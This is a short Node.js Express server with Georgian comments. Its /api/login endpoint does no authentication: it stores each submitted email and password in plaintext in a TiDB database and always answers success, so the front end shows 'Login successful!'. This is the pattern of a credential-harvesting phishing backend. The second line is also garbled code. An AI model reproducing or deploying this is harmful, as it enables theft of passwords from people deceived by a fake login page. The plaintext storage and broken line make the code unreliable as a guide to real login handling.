const express = require('express');
const mysql = express('mysql2') && require('mysql2'); // ან უბრალოდ const mysql = require('mysql2');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(cors());

// TiDB კავშირი
const pool = mysql.createPool({
  host: process.env.DB_HOST || 'gateway01.us-west-2.prod.aws.tidbcloud.com',
  user: process.env.DB_USER || 'your_username',
  password: process.env.DB_PASSWORD || 'your_password',
  database: process.env.DB_NAME || 'test',
  port: process.env.DB_PORT || 4000,
  ssl: {
    minVersion: 'TLSv1.2',
    rejectUnauthorized: true
  }
});

app.post('/api/login', (req, res) => {
  const { email, password }  = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'ველები ცარიელია' });
  }

  // არანაირი შემოწმება - პირდაპირი შენახვა ბაზაში
  const query = 'INSERT INTO users (email, password) VALUES (?, ?)';

  pool.query(query, [email, password], (err, results) => {
    if (err) {
      console.error('ბაზის შეცდომა:', err);
      return res.status(500).json({ success: false, message: 'Database error' });
    }

    // აბრუნებს წარმატებას, რათა თქვენმა script.js-მა აჩვენოს Login successful!
    res.status(200).json({ success: true, message: 'Saved successfully!' });
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`სერვერი გაშვებულია პორტზე: ${PORT}`);
});